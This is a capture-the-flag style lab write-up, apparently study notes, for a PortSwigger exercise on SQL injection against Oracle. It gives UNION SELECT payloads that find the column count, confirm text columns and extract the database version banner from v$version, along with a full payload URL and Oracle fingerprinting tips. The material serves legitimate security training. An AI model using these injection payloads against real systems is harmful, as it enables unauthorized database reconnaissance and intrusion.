# Lab 07 — SQL injection attack, querying the database type and version on Oracle

| | |
|---|---|
| **Difficulty** | 🟨 Practitioner |
| **Category** | Examining the database |
| **Concept** | [08 — Examining the database](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle |

---

## 🎯 Objective
Display the **database version string**. This lab runs on **Oracle**.

## 🧠 Background
Oracle differs from other engines in two ways that matter here:
- Every `SELECT` **must** have a `FROM` clause → use the built-in dummy table **`dual`**.
- The version lives in **`v$version`**.

## 🪜 Methodology
1. Determine column count (it's **2**) and confirm both are text:
   ```
   ?category=Gifts' UNION SELECT NULL,NULL FROM dual--
   ?category=Gifts' UNION SELECT 'a','b' FROM dual--
   ```
2. Retrieve the banner/version:
   ```
   ?category=Gifts' UNION SELECT BANNER, NULL FROM v$version--
   ```

## 💥 Payload
```
https://LAB-ID.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

## ✅ Why it works
`v$version` is an Oracle data-dictionary view that returns version banners. Selecting `BANNER` into a text column renders the Oracle version in the response, confirming both the **engine** and its **version**.

## 🧭 Oracle tells (fingerprinting)
- `FROM dual` required on constant selects.
- `v$version`, `all_tables`, `all_tab_columns` present.
- Identifiers stored in **UPPERCASE** by default.

## 🛡️ Remediation
See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
Fingerprint before you exploit — Oracle payloads need `dual`. `#sqli` `#practitioner` `#oracle` `#fingerprint`
